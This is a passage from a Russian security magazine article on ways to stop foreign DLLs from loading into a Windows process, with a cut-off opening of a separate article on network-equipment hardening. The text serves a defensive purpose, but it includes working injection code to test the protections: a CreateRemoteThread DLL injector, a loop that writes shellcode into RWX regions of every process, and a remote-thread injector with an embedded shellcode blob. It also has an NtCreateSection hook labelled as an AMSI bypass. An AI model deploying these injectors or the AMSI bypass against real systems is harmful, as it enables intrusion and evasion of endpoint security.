printf("[!] Local Process Is Not Protected With The Block Dll Policy
\n");


CHAR pcFilename[MAX_PATH * 2];
if (!GetModuleFileNameA(NULL, (LPSTR)&pcFilename, MAX_PATH * 2)) {
  printf("[!] GetModuleFileNameA Failed With Error : %d \n",
GetLastError());
  return -1;
}


DWORD dwBufferSize = (DWORD)(lstrlenA(pcFilename) + lstrlenA(STOP_ARG
) + 0xFF);
CHAR* pcBuffer = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
dwBufferSize);
if (!pcBuffer)
  return FALSE;


sprintf_s(pcBuffer, dwBufferSize, "%s %s", pcFilename, STOP_ARG);


if (!CreateProcessWithBlockDllPolicy(pcBuffer, &dwProcessId, &
hProcess, &hThread)) {
  return -1;
}


HeapFree(GetProcessHeap(), 0, pcBuffer);


printf("[i] Process Created With Pid %d \n", dwProcessId);

По ра приступать к проверке. Сна чала запускаем наш процесс с защитой.
Ском пилиро ванный файл я назвал ProtectedProcess.exe.





                         Запуск файла

Видим, что наш файл имеет особый бит, который показывает даже Process
Hacker.





                      Защищенный процесс

Те перь попробуем внедриться. Для это го я написал простей ший инжектор
на CreateRemoteThread().


#include <Windows.h>
#include <iostream>
int main(int argc, char* argv[]) {
  HANDLE processHandle;
  PVOID remoteBuffer;
  wchar_t dllPath[] = TEXT("A:\\SSD\\ProjectsVS\\DllCpp\\x64\\Debug\\
DllInj.dll");


  DWORD pid;
  std::cin >> pid;


  processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  std::cout << "OpenProcess: " << GetLastError() << std::endl;
  remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(dllPath),
MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  std::cout << "VirtualAllocEx: " << GetLastError() << std::endl;
  WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath,
sizeof(dllPath), NULL);
  std::cout << "WriteProcessMemory: " << GetLastError() << std::endl;
  PTHREAD_START_ROUTINE threatStartRoutineAddress = (
PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32"
)), "LoadLibraryW");
  CreateRemoteThread(processHandle, NULL, 0,
threatStartRoutineAddress, remoteBuffer, 0, NULL);
  std::cout << "CreateRemoteThread: " << GetLastError() << std::endl;
  CloseHandle(processHandle);


  return 0;
}

Инжектор загружает библиотеку со следующим кодом:


#include "pch.h"
#include <iostream>
#include <string>


BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, PVOID
fImpLoad) {
  switch (fdwReason) {
  case DLL_PROCESS_ATTACH:
    DWORD dwProcessId = GetCurrentProcessId();
    HANDLE hFile = CreateFileA("A:\\ssd\\ProjectsVS\\DllCpp\\x64\\
Debug\\hi.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
      std::string content = "Process ID: " + std::to_string(
dwProcessId) + "\r\n";
      DWORD bytesWritten;
      WriteFile(hFile, content.c_str(), content.size(), &bytesWritten
, NULL);
      CloseHandle(hFile);
    }
  }
  return(TRUE);
}

Здесь нет ничего слож ного — соз дание файла и запись в него PID текущего
про цесса. Сначала про верим работу на безобидном про цессе, например
GoogleCrashHandler.exe с PID 8968.





                  Внедрение в процесс работает

Те перь попробуем внедриться в защищенный процесс.





                     Ин жект не сра ботал

Не удача! Инжект не сработал.
   Если попробуем внед риться через Process Hacker, тоже стол кнемся
с невозможностью выпол нения нашей библиотеки.


SETPROCESSMITIGATIONPOLICY

Эту функцию также мож но исполь зовать для предотвращения подгрузки
в наш процесс левых DLL. Заметь, что подоб ное предотвращение подгрузки
либ применяется к текущему процес су и только пос ле вызова этой функции.
Если же хакер внедряет свою библиотеку до вызова этой функции, то у него
все получится. Если после, то ничего не вый дет. И опять же единс твенное
исклю чение — DLL, подписанные в Microsoft. Они все равно без проб лем
смогут внедрять ся в наш процесс.
   Здесь код будет попроще, чем в прошлый раз.


#include <Windows.h>
#include <iostream>


int main() {


  PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY Struct = { 0 };


  Struct.MicrosoftSignedOnly = 1;


  if (!SetProcessMitigationPolicy(ProcessSignaturePolicy, &Struct,
sizeof(Struct))) {
    printf("[!] SetProcessMitigationPolicy Failed With Error : %d \n"
, GetLastError());
  }
  getchar();


  return 0;
}

Запускаем.





                    Процесс с ограничением

Вновь попытка внедрить ся окажет ся безуспешной.





                     Внедрить ся невоз можно




                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ



                   ИЗУЧАЕМ МЕТОДЫ
         ПРЕДОТВРАЩЕНИЯ ПОДГРУЗКИ
                                  DLL





ÂÊËÞ×ÅÍÈÅ ACG

ACG  (он  же  ProcessDynamicCodePolicy) —  специальный  механизм
в Windows, который предотвра щает выделение или изме нение страниц
в памяти, име ющих бит Execute. Это несколько усложняет внед рение биб-
лиотек.
  После включения ACG ядро Windows предот вращает создание и изме-
нение исполня емых страниц в памяти. При этом работа ют следующие пра-
вила:
 1. Страницы с кодом считаются неизменны ми. Существу ющие кодовые стра-
  ницы нельзя сделать доступны ми для записи, они всегда име ют пред-
   назначенное для них содержимое. Для это го соз дают ся допол нитель ные
   проверки в диспетчере памяти. Нап ример, больше нель зя исполь зовать
  VirtualProtect()   для   преобра зования   стра ницы   в   памяти
   в PAGE_EXECUTE_READWRITE.
 2. Новые непод писан ные страницы с кодом создавать нельзя. Например,
   не выйдет исполь зовать VirtualAlloc() для создания страницы с раз-
  решениями PAGE_EXECUTE_READWRITE.

Вот пример кода, который включает ACG:


#include <iostream>
#include <Windows.h>
#include <processthreadsapi.h>


int main()
{
  STARTUPINFOEX si;
  DWORD oldProtection;


  PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy;
  ZeroMemory(&policy, sizeof(policy));
  policy.ProhibitDynamicCode = 1;


  void* mem = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
  if (mem == NULL) {
    printf("[!] Error allocating RWX memory\n");
  }
  else {
    printf("[*] RWX memory allocated: %p\n", mem);
  }


  printf("[*] Now running SetProcessMitigationPolicy to apply
PROCESS_MITIGATION_DYNAMIC_CODE_POLICY\n");


  if (SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &policy,
sizeof(policy)) == false) {
    printf("[!] SetProcessMitigationPolicy failed\n");
    return 0;
  }


  mem = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
  if (mem == NULL) {
    printf("[!] Error allocating RWX memory\n");
  }
  else {
    printf("[*] RWX memory allocated: %p\n", mem);
  }


  void* ntAllocateVirtualMemory = GetProcAddress(LoadLibraryA("ntdll.
dll"), "NtAllocateVirtualMemory");


  if (!VirtualProtect(ntAllocateVirtualMemory, 4096,
PAGE_EXECUTE_READWRITE, &oldProtection)) {
    printf("[!] Error updating NtAllocateVirtualMemory [%p] memory
to RWX\n", ntAllocateVirtualMemory);
  }
  else {
    printf("[*] NtAllocateVirtualMemory [%p] memory updated to RWX\n"
, ntAllocateVirtualMemory);
  }


  return 0;
}

Тем не менее этот метод нам не очень под ходит, так как его легко обойти:
достаточно инжектиться в регионы, уже имеющие статус RWX. Например, вот
так:


#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>


int main()
{
  MEMORY_BASIC_INFORMATION mbi = {};
  LPVOID offset = 0;
  HANDLE process = NULL;
  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  PROCESSENTRY32 processEntry = {};
  processEntry.dwSize = sizeof(PROCESSENTRY32);
  DWORD bytesWritten = 0;
  unsigned char shellcode[] = "...";


  Process32First(snapshot, &processEntry);
  while (Process32Next(snapshot, &processEntry))
  {
    process = OpenProcess(MAXIMUM_ALLOWED, false, processEntry.
th32ProcessID);
    if (process)
    {
      std::wcout << processEntry.szExeFile << "\n";
      while (VirtualQueryEx(process, offset, &mbi, sizeof(mbi)))
      {
        offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize
);
        if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.
State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
        {
          std::cout << "\tRWX: 0x" << std::hex << mbi.BaseAddress <<
"\n";
          WriteProcessMemory(process, mbi.BaseAddress, shellcode,
sizeof(shellcode), NULL);
          CreateRemoteThread(process, NULL, NULL, (
LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL);
        }
      }
      offset = 0;
    }
    CloseHandle(process);
  }


  return 0;
}

Другой вариант — инжектиться через удаленные потоки. К моему удив лению,
в ответ на такой инжект защита не сработала.


#include <iostream>
#include <Windows.h>


int main(int argc, char *argv[]) {
 unsigned char shellcode[] =
  "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
  "\xff\xff\x48\xbb\x1d\xbe\xa2\x7b\x2b\x90\xe1\xec\x48\x31\x58"
  "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe1\xf6\x21\x9f\xdb\x78"
  "\x21\xec\x1d\xbe\xe3\x2a\x6a\xc0\xb3\xbd\x4b\xf6\x93\xa9\x4e"
  "\xd8\x6a\xbe\x7d\xf6\x29\x29\x33\xd8\x6a\xbe\x3d\xf6\x29\x09"
  "\x7b\xd8\xee\x5b\x57\xf4\xef\x4a\xe2\xd8\xd0\x2c\xb1\x82\xc3"
  "\x07\x29\xbc\xc1\xad\xdc\x77\xaf\x3a\x2a\x51\x03\x01\x4f\xff"
  "\xf3\x33\xa0\xc2\xc1\x67\x5f\x82\xea\x7a\xfb\x1b\x61\x64\x1d"
  "\xbe\xa2\x33\xae\x50\x95\x8b\x55\xbf\x72\x2b\xa0\xd8\xf9\xa8"
  "\x96\xfe\x82\x32\x2a\x40\x02\xba\x55\x41\x6b\x3a\xa0\xa4\x69"
  "\xa4\x1c\x68\xef\x4a\xe2\xd8\xd0\x2c\xb1\xff\x63\xb2\x26\xd1"
  "\xe0\x2d\x25\x5e\xd7\x8a\x67\x93\xad\xc8\x15\xfb\x9b\xaa\x5e"
  "\x48\xb9\xa8\x96\xfe\x86\x32\x2a\x40\x87\xad\x96\xb2\xea\x3f"
  "\xa0\xd0\xfd\xa5\x1c\x6e\xe3\xf0\x2f\x18\xa9\xed\xcd\xff\xfa"
  "\x3a\x73\xce\xb8\xb6\x5c\xe6\xe3\x22\x6a\xca\xa9\x6f\xf1\x9e"
  "\xe3\x29\xd4\x70\xb9\xad\x44\xe4\xea\xf0\x39\x79\xb6\x13\xe2"
  "\x41\xff\x32\x95\xe7\x92\xde\x42\x8d\x90\x7b\x2b\xd1\xb7\xa5"
  "\x94\x58\xea\xfa\xc7\x30\xe0\xec\x1d\xf7\x2b\x9e\x62\x2c\xe3"
  "\xec\x1c\x05\xa8\x7b\x2b\x95\xa0\xb8\x54\x37\x46\x37\xa2\x61"
  "\xa0\x56\x51\xc9\x84\x7c\xd4\x45\xad\x65\xf7\xd6\xa3\x7a\x2b"
  "\x90\xb8\xad\xa7\x97\x22\x10\x2b\x6f\x34\xbc\x4d\xf3\x93\xb2"
  "\x66\xa1\x21\xa4\xe2\x7e\xea\xf2\xe9\xd8\x1e\x2c\x55\x37\x63"
  "\x3a\x91\x7a\xee\x33\xfd\x41\x77\x33\xa2\x57\x8b\xfc\x5c\xe6"
  "\xee\xf2\xc9\xd8\x68\x15\x5c\x04\x3b\xde\x5f\xf1\x1e\x39\x55"
  "\x3f\x66\x3b\x29\x90\xe1\xa5\xa5\xdd\xcf\x1f\x2b\x90\xe1\xec"
  "\x1d\xff\xf2\x3a\x7b\xd8\x68\x0e\x4a\xe9\xf5\x36\x1a\x50\x8b"
  "\xe1\x44\xff\xf2\x99\xd7\xf6\x26\xa8\x39\xea\xa3\x7a\x63\x1d"
  "\xa5\xc8\x05\x78\xa2\x13\x63\x19\x07\xba\x4d\xff\xf2\x3a\x7b"
  "\xd1\xb1\xa5\xe2\x7e\xe3\x2b\x62\x6f\x29\xa1\x94\x7f\xee\xf2"
  "\xea\xd1\x5b\x95\xd1\x81\x24\x84\xfe\xd8\xd0\x3e\x55\x41\x68"
  "\xf0\x25\xd1\x5b\xe4\x9a\xa3\xc2\x84\xfe\x2b\x11\x59\xbf\xe8"
  "\xe3\xc1\x8d\x05\x5c\x71\xe2\x6b\xea\xf8\xef\xb8\xdd\xea\x61"
  "\xb4\x22\x80\xcb\xe5\xe4\x57\x5a\xad\xd0\x14\x41\x90\xb8\xad"
  "\x94\x64\x5d\xae\x2b\x90\xe1\xec";


  HANDLE processHandle;
  HANDLE remoteThread;
  PVOID remoteBuffer;


  printf("Injecting to PID: %i", atoi(argv[1]));
  processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(
argv[1])));
  remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode
, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof
shellcode, NULL);
  remoteThread = CreateRemoteThread(processHandle, NULL, 0, (
LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
  CloseHandle(processHandle);
}


ÇÀÏÓÑÊ ÏÐÎÖÅÑÑÀ Ñ DEBUG

Ме тод основан на запус ке про цесса с фла гом DEBUG_ONLY_THIS_PROCESS.
Это приводит к тому, что родительский процесс может действовать в качес-
тве отладчи ка для нового процесса. Так наша прог рамма может установить
собствен ные колбэки, которые будут вызваны при появлении опре делен ных
событий. Таким образом мы можем кон тролировать все, что про исходит
с процессом. Для пре дотвращения под груз ки DLL нужно уста новить флаг
LOAD_DLL_DEBUG_EVENT, который сработает после загрузки DLL-библиотеки
в процесс, но до того, как из нее будет вызвана функция DllMain().
  Фак тичес ки наш родительский процесс просто будет проверять загружа-
емую в дочер ний процесс DLL. Если это была нелеги тим ная DLL, то функция
прос то пропатчит ее Entrypoint, и ини циализиро вать DLL будет невоз-
можно.





                        Как делает SharpBlock

На GitHub есть два проекта, реализующих этот метод:
 • DebugAmsi;
 • SharpBlock.

Предлагаю написать минимальный PoC — будем запус кать калькулятор
и отсле живать его биб лиотеки.


#include <Windows.h>
#include <iostream>
#include <string>


DWORD WINAPI DebugLoop(LPVOID lpParam)
{
  HANDLE hProcess = static_cast<HANDLE>(lpParam);
  DEBUG_EVENT debugEvent;
  DWORD continueStatus = DBG_CONTINUE;


  while (WaitForDebugEvent(&debugEvent, INFINITE))
  {
    switch (debugEvent.dwDebugEventCode)
    {
    case LOAD_DLL_DEBUG_EVENT:
    {
      char szName[MAX_PATH];
      if (GetFinalPathNameByHandleA(debugEvent.u.LoadDll.hFile,
szName, MAX_PATH, VOLUME_NAME_DOS))
      {
        std::cout << "DLL Loaded: " << szName << std::endl;
        std::cout << "Base Address: " << debugEvent.u.LoadDll.
lpBaseOfDll << std::endl;


      }
      CloseHandle(debugEvent.u.LoadDll.hFile);
      break;
    }
    }


    ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId,
continueStatus);
  }


  return 0;
}


int main()
{
  LPCWSTR exePath = L"c:\\windows\\system32\\calc.exe";
  STARTUPINFO si;
  PROCESS_INFORMATION pi;


  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  ZeroMemory(&pi, sizeof(pi));


  if (!CreateProcess(exePath, NULL, NULL, NULL, FALSE,
DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &si, &pi))
  {
    std::cerr << "Unable to create process!";
    return 1;
  }


  DebugLoop((LPVOID)pi.hProcess);


  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);


  return 0;
}

Код про ще некуда: сначала идет стан дартное создание процесса, затем
в  бесконеч ном  цикле  ловим  Debug-события  с  помощью  функции
WaitForDebugEvent(), а затем обрабатываем событие LOAD_DLL_DEBUG_EVENT.





                    По лучение информации

Как ты понимаешь, с базовым адресом биб лиотеки можно обратно перех-
ватить кон троль у атакующего, про патчить Entrypoint, снять хук и так далее.
   Кстати, мы можем при цепиться и к уже работа ющему процес су с помощью
функции DebugActiveProcess(). Подробно эту фун кцию я раз бирал в статье
«Злой отладчик».


ÕÓÊ ÍÀ NTCREATESECTION

Ïðîñòîé âàðèàíò
Этот способ обхо да осно ван на перехвате функции NtCreateSection(),
которая вызывается при попыт ке заг рузить DLL в адресное пространство
про цесса.
   Если мы можем поставить хук на NtCreateSection() (либо NtOpenFile(),
либо NtMapViewOfSection()), то у нас получит ся перехватить попытку мап-
пинга в память процесса кода DLL, а затем вернуть NTSTATUS FAILED —
это будет означать, что мап пинг невозможен. Как следствие, библиоте ка
не будет заг ружена. Либо можем вер нуть фейковый хендл на загруженную
библиотеку, что также сделает ее выполнение невозможным.
  Проблема это го метода лишь в том, что он сра бота ет только для DLL,
которые будут подгружаться в про цесс после установки хука. Если они под-
гружаются раньше, то ничего не сработает. Тем не менее есть более хитрый
вари ант.
  Обычно этот метод используется анти вирусами, чтобы отслеживать, что
мап пится в память. Причем мы можем поставить этот хук как в сво ем процес-
се,  так и  в  чужом,  если сможем  запросить  на  него мас ку дос тупа
PROCESS_VM_WRITE.
   Хук  мы  можем  пос тавить  на  NtOpenFile(),  NtCreateSection()
или NtMapViewOfSection(). Когда уви дим, что зловредная библиотека пыта-
ется загрузиться, предотвратим это, вернув неверный дескриптор DLL.
  Для этой техники есть полноцен ный PoC на GitHub.
  В примере будем использовать хук на NtCreateSection(). Основная
логика — в этих строчках кода:


std::string data_hash2[] =
{
  "fbd13447dcd3ab91bb0d2324e11eca986967c99dcd324b00f9577010c6080413",
//SHA256 of the UNC Path of the AMSI dll and other Windows Defender
injected DLLs
  "856efe1b2c5b5716b4d373bb7205e742da90d51256371c582ce82b353d900186",
  "d8d52609d0c81d70bf44cb3cd5732a1c232cc20c25342d0a118192e652a12d98",
  "a75589e0d1b5b8f0ad28f508ed28df1b4406374ac489121c895170475fe3ef74"



}; //array with the file hashes




NTSTATUS ntCreateMySection(OUT PHANDLE SectionHandle, IN ULONG
DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN
PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN
ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL) /*Bypass
AMSI*/
{
  int isFinal = 0;
  char lpFilename[256];
  if (FileHandle != NULL)
  {


    DWORD res = GetFinalPathNameByHandleA(FileHandle, lpFilename, 256
, FILE_NAME_OPENED | VOLUME_NAME_DOS); //Get the file path of the
file handle
    if (res == 0)
      printf("GetFinalPathNameByHandleA error: %d\n", GetLastError())
;


    else
    {
      std::string hash = sha256(std::string(lpFilename)); //Compute
the SHA256 hash of the file path (only the hash of the name, not the
file)
      unsigned int arrSize = sizeof(data_hash2) / sizeof(data_hash[0
]); //Get the size of the array
      for (int counter = 0; counter < arrSize; counter++) //Loop
each position of the array
      {
        if (hash.compare(data_hash2[counter]) == 0) //If hash of the
DLL to load is equal to any of the array hashes return 0
        {
          return -1;
        }
      }
    }
  }
  restore_hook_ntcreatesection(SectionHandle, DesiredAccess,
ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes,
FileHandle); //If it's not an AMSI DLL restore the original
NtCreateSection
  return 1;
}

В начале кода — массив, содержащий список хешей от имен DLL, загрузку
которых мы хотим обрабаты вать. Полный путь до под гружаемой биб лиотеки
получен с помощью GetFinalPathNameByHandleA().
   Если хеш содержится в нашем списке, то возвра щаем ошибку  (-1
в  NTSTATUS  рав нозначно  ошибке),  если  нет,  то  дергаем  реальный
NtCreateSection() и позволя ем про цес су нор мально обра батывать заг-
рузку.
   Если хеша в массиве нет, перенаправляем поток управления к реальному
NtCreateSection() и позволим процессу маппить библиотеку.


Ìîäèôèöèðîâàííûé âàðèàíò
Пре дыдущую технику можно усовершенство вать.
  Процесс, созданный с флагом CREATE_SUSPENDED или DEBUG_PROCESS,
будет иметь в адресном прос транстве только одну DLL — ntdll.dll. Такова
особенность Windows. Помнишь главный минус хука NtCreateSection()
в рассмот ренном выше простом варианте? Если хук очень дол го ставится, то
библиотеки успе ют подгру зиться!
  Именно поэтому мы должны запускать процесс в при остановленном виде,
ста вить хук на NtCreateSection() и лишь затем возобновлять процесс. Тог-
да мы смо жем контро лировать абсо лютно все заг ружаемые в процесс биб-
лиотеки. Даже муха не прос кочит!
  На этом основан PoC Ruy-Lopez.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ



                   ИЗУЧАЕМ МЕТОДЫ
         ПРЕДОТВРАЩЕНИЯ ПОДГРУЗКИ
                                  DLL





WMI

У WMI есть отличный класс Win32_ModuleLoadTrace, в котором куча информа-
ции! Мож но подписаться на него, а затем узнавать бук вально обо всех слу-
чаях подгрузки библиотек в Windows. Информа цию сможем извлечь сле-
дующую:


[AMENDMENT]
class Win32_ModuleLoadTrace : Win32_ModuleTrace
{
  uint8  SECURITY_DESCRIPTOR[];
  uint64 TIME_CREATED;
  string FileName;
  uint64 DefaultBase;
  uint64 ImageBase;
  uint32 ImageChecksum;
  uint64 ImageSize;
  uint32 ProcessID;
  uint32 TimeDateSTamp;
};

Единственный минус — на «плю сах» тяжко работать с WMI. Поэтому перей-
дем на C#. У C# есть класс ManagementEventWatcher, который позволяет под-
писаться на опре деленные события. Подписка зак лючается в регистра ции
колбэка, который будет вызывать ся каж дый раз при появлении события.


using System;
using System.Diagnostics;
using System.Management;


public class Program
{
  public static void Main()
  {
    ManagementEventWatcher watcher = new ManagementEventWatcher(
      new WqlEventQuery("SELECT * FROM Win32_ModuleLoadTrace"));


    watcher.EventArrived += new EventArrivedEventHandler(
ModuleLoadHandler);


    watcher.Start();


    Console.WriteLine("Monitoring DLL loading. Press any key to exit.
");
    Console.ReadKey();


    watcher.Stop();
    watcher.Dispose();
  }


  public static string GetProcessNameByPid(string pidString)
  {
    string processName = "Unknown";


    if (int.TryParse(pidString, out int pid))
    {
      try
      {
        Process process = Process.GetProcessById(pid);
        processName = process.ProcessName;
      }
      catch (ArgumentException ex)
      {
        Console.WriteLine($"No process with PID {pid} is currently
running: {ex.Message}");
      }
      catch (Exception ex)
      {
        Console.WriteLine($"Error retrieving process name: {ex.
Message}");
      }
    }
    else
    {
      Console.WriteLine($"Invalid PID format: {pidString}");
    }


    return processName;
  }


  private static void ModuleLoadHandler(object sender,
EventArrivedEventArgs e)
  {
    ManagementBaseObject evt = e.NewEvent;
    Console.WriteLine("NEW DLL Loaded");
    Console.WriteLine("\tFileName: " + evt["FileName"]);
    Console.WriteLine("\tBaseAddress: 0x" + ((UInt64)evt["ImageBase"
]).ToString("X"));
    Console.WriteLine("\tSize: " + evt["ImageSize"]);
    Console.WriteLine("\tPID: " + evt["ProcessID"]);
    Console.WriteLine("\tProcessName: " + GetProcessNameByPid(evt[
"ProcessID"].ToString()));
  }
}

В качестве колбэка указываем функцию ModuleLoadHandler(), где обра-
баты ваем и извле каем инфу из клас са Win32_ModuleLoadTrace.





                  Информация о биб лиотеках

Есть и более серьезные PoC, например ModuleMonitor.


DLL NOTIFICATION CALLBACKS

Сам механизм DLL Notication служит для защиты от DLL Proxying. Этот
механизм позволяет зарегистри ровать колбэк, который вызывается при под-
грузке DLL или выг рузке ее из процесса.
  Для это го используется специальная фун кция LdrDllNotication:


VOID CALLBACK LdrDllNotification(
  _In_   ULONG             NotificationReason,
  _In_   PCLDR_DLL_NOTIFICATION_DATA NotificationData,
  _In_opt_ PVOID             Context
);

С помощью этой функции можно зарегистри ровать колбэк, который будет
вызван при загрузке в про цесс или выгрузке DLL. Сам кол бэк определен
в LdrRegisterDllNotication. При чем кол бэков можно регистри ровать неог-
раниченное количество — все они будут вызваны по оче реди.
   Кстати, этот механизм использует Discord!
   Единственный минус — здесь исполь зует ся куча структур, которые придет-
ся объявлять вручную.


#include <Windows.h>
#include <stdio.h>


typedef struct _UNICODE_STR
{
  USHORT Length;
  USHORT MaximumLength;
  PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;



typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
  ULONG       Flags;       // Reserved.
  PUNICODE_STR FullDllName;     // The full path name of the DLL
module.
  PUNICODE_STR BaseDllName;     // The base file name of the DLL
module.
  PVOID       DllBase;       // A pointer to the base address for
the DLL in memory.
  ULONG       SizeOfImage;     // The size of the DLL image, in
bytes.
} LDR_DLL_LOADED_NOTIFICATION_DATA, *
PLDR_DLL_LOADED_NOTIFICATION_DATA;


typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA {
  ULONG       Flags;       // Reserved.
  PUNICODE_STR FullDllName;     // The full path name of the DLL
module.
  PUNICODE_STR BaseDllName;     // The base file name of the DLL
module.
  PVOID       DllBase;       // A pointer to the base address for
the DLL in memory.
  ULONG       SizeOfImage;     // The size of the DLL image, in
bytes.
} LDR_DLL_UNLOADED_NOTIFICATION_DATA, *
PLDR_DLL_UNLOADED_NOTIFICATION_DATA;


typedef union _LDR_DLL_NOTIFICATION_DATA {
  LDR_DLL_LOADED_NOTIFICATION_DATA   Loaded;
  LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA, * PLDR_DLL_NOTIFICATION_DATA;


typedef VOID(CALLBACK* PLDR_DLL_NOTIFICATION_FUNCTION)(
  ULONG             NotificationReason,
  PLDR_DLL_NOTIFICATION_DATA  NotificationData,
  PVOID             Context);


typedef struct _LDR_DLL_NOTIFICATION_ENTRY {
  LIST_ENTRY           List;
  PLDR_DLL_NOTIFICATION_FUNCTION Callback;
  PVOID              Context;
} LDR_DLL_NOTIFICATION_ENTRY, * PLDR_DLL_NOTIFICATION_ENTRY;


typedef NTSTATUS(NTAPI* _LdrRegisterDllNotification) (
  ULONG              Flags,
  PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
  PVOID              Context,
  PVOID* Cookie);


typedef NTSTATUS(NTAPI* _LdrUnregisterDllNotification)(PVOID Cookie);


VOID MyCallback(ULONG NotificationReason, const
PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
{
  printf("[MyCallback] dll loaded: %Z\n", NotificationData->Loaded.
BaseDllName);
}


int main()
{
  HMODULE hNtdll = GetModuleHandleA("NTDLL.dll");


  if (hNtdll != NULL) {


    _LdrRegisterDllNotification pLdrRegisterDllNotification = (
_LdrRegisterDllNotification)GetProcAddress(hNtdll,
"LdrRegisterDllNotification");



    PVOID cookie;
    NTSTATUS status = pLdrRegisterDllNotification(0, (
PLDR_DLL_NOTIFICATION_FUNCTION)MyCallback, NULL, &cookie);
    if (status == 0) {
      printf("[+] Successfully registered callback\n");
    }
    printf("[+] Press enter to continue\n");
    getchar();


    printf("[+] Loading USER32 DLL now\n");
    LoadLibraryA("USER32.dll");
  }
}





                      Информация о DLL


ETW (KERNEL PROVIDER)

Этот подход, я думаю, мож но считать наиболее эффектив ным. Проб лема
лишь в том, что пот ребуется запуск нашего кода от лица локального адми нис-
тратора либо любого дру гого привилегирован ного пользователя.
   Если углубляться в то, как программировать под ETW, то придется писать
целый цикл статей, но не рассказать об этом способе я посчитал преступле-
нием, поэтому рассмотрим все на некотором уровне абстрак ций.
  Один из фундамен тов ETW — провай деры. Про вайдеры генерирует
события. Есть осо бый тип провайдеров — Kernel Provider. Его имя — Windows
Kernel Trace, а вот его GUID:


9E814AAD-3204-11D2-9A82-006008A86939

К  нему  тоже  можно   получить  дос туп  с  помощью  переменной
SystemTraceControlGuid, определенной в evntrace.h. Этот провайдер
позволит нам отсле живать события, характерные для ядра Windows. Нап-
ример, запуск про цессов, под груз ку библиотеки и про чее.
   Изучить дос тупные события, которые генерирует провайдер, можно
с помощью вот такой команды:


logman query providers "Windows Kernel Trace"





                   Что предоставляет Kernel Provider




                    Опи сания отдельных событий ядра ты найдешь в
                      докумен тации.


До Windows 8 с про вайдером ядра можно было установить только один
сеанс, который дол жен был называть ся NT Kernel Logger. К счастью, сейчас
такие ограничения сняты, сессий может быть бесконечно много, а имя сес-
сии может быть любым.
  Ядро может одновременно сооб щать сразу о разных типах событий. Нап-
ример, о создании процесса и о под грузке биб лиотеки.
  Пример кода для подписи на Kernel Provider можно взять на GitHub. Этот
код отлично под ходит для иллюс тра ции воз можнос тей ETW.
  Для извле чения информа ции о подгружаемых библиотеках нас трой проект
так, как на скриншоте.





                      Настройка Visual Studio

И сможешь извлекать информацию о биб лиотеках!





                  ETW и подгрузка биб лиотек


ÂÛÂÎÄÛ

Об наружить, пре дотвратить, обезвредить... Раз работчикам теперь недос-
таточно просто писать код. Нужно уметь еще и защитить его. К счастью,
методов очень мно го, но сто ит помнить, что на любую защиту най дется атака.
Таков мир информацион ной безопас ности!
АДМИН





Бе зопас ность     телекоммуникацион ных
устройств —  воп рос  острый, осо бен но
в последнее время. Атаки на инфраструк-
туры про вайдеров про исхо дят все чаще.
В  этой  статье  я  рас скажу,  как можно               Caster                                                                                        Network Security Expert
защитить сетевое обо рудо вание от потен-             @wearecaster
циального вторжения.


Это «VIP-ремикс» моей статьи Save Me, в которой я продемонстрировал спо-
собы защиты локаль ной сети от спу финг-атак. В этот раз я рас ширю обзор
механизмов безопасности оборудования и опи шу новые техники защиты.
  Все коман ды я буду демонстрировать на Cisco IOS. Однако сами механиз-
мы безопасности реализованы у всех вендоров, отличия лишь в иерархии
рас положе ния компонентов и синтаксисе.


ÁÅÇÎÏÀÑÍÎÑÒÜ ÊÎÌÌÓÒÀÖÈÎÍÍÎÉ ÌÀÒÐÈÖÛ CAM

CAM (Content Addressable Memory) — это ассоциативная память коммутато-
